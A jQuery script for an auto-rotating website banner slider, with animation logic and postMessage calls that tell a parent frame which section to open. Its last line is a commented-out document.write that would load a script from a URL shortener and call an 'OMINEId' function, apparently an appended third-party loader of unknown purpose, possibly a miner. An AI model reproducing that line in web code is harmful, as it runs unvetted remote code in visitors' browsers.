/**
 * Created by yundan on 17/3/22.
 */
var curIndex = 0;
var time = 800;
var slideTime = 3000;
var adTxt = $("#banner_img>li>div.ad_txt");
var adImg = $("#banner_img>li>div.add_img");
var int = setInterval("autoSlide()", slideTime);
var time1 = 800;
var intTime="";

$("#banner_ctr>ul>li>div").mouseenter(function () {
    window.clearInterval(int);
    time1=80;
    show($(this).parent().index());
});
$("#banner_ctr>ul>li>div").mouseleave(function () {
    int = setInterval("autoSlide()", slideTime);
});

$("#banner_ctr>ul>li").mousedown(function () {
    window.clearInterval(int);
    show($(this).index());
    loader($(this).index());
});
$("#banner_ctr>ul>li").mouseup(function () {
    int = setInterval("autoSlide()", slideTime);
});

function autoSlide() {
    time1 = 800;
    curIndex + 1 >= $("#banner_img>li").size() ? curIndex = -1 : false;
    show(curIndex + 1);
}

function show(index) {
    $("#banner_img>li").eq(curIndex).stop(false, true).fadeOut(time1);
    $("#banner_ctr>ul>li>div").eq(curIndex).removeClass("active");
    adTxt.eq(curIndex).stop(false, true).animate({top: "9rem"}, time);
    adImg.eq(curIndex).stop(false, true).animate({left: "0"}, time);
    window.clearTimeout(intTime);
    intTime=setTimeout(function () {
        $("#banner_img>li").eq(index).stop(false, true).fadeIn(time);
        $("#banner_ctr>ul>li>div").eq(index).addClass("active");
        adTxt.eq(index).children("p").css({
            paddingTop: "50px",
            paddingBottom: "50px"
        }).stop(false, true).animate({paddingTop: "0", paddingBottom: "0"}, time);
        adTxt.eq(index).css({top: "-4rem", opacity: "0"}).stop(false, true).animate({top: "4.6rem", opacity: "1"}, time);
        adImg.eq(index).css({left: "-8rem", opacity: "0"}).stop(false, true).animate({
            left: "0",
            opacity: "1"
        }, time);
    }, 0)
    curIndex = index;
}

function  loader(number) {
    switch (number) {
        // case 0:
        //     window.parent.postMessage({ data:"tosy" },'*');
        //     break;
        case 0:
            window.parent.postMessage({ data:"toBaseInfo" },'*');
            break;
        case 1:
            window.parent.postMessage({ data:"toPlantInfo" },'*');
            break;
        case 2:
            window.parent.postMessage({ data:"toProcessInfo" },'*');
            break;
        case 3:
            window.parent.postMessage({ data:"toTransportInfo" },'*');
            break;
        case 4:
            window.parent.postMessage({ data:"toFwsyInfo" },'*');
            break;
        case 5:
            window.parent.postMessage({ data:"tocunzheng" },'*');
            break

    }
    
}


//document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
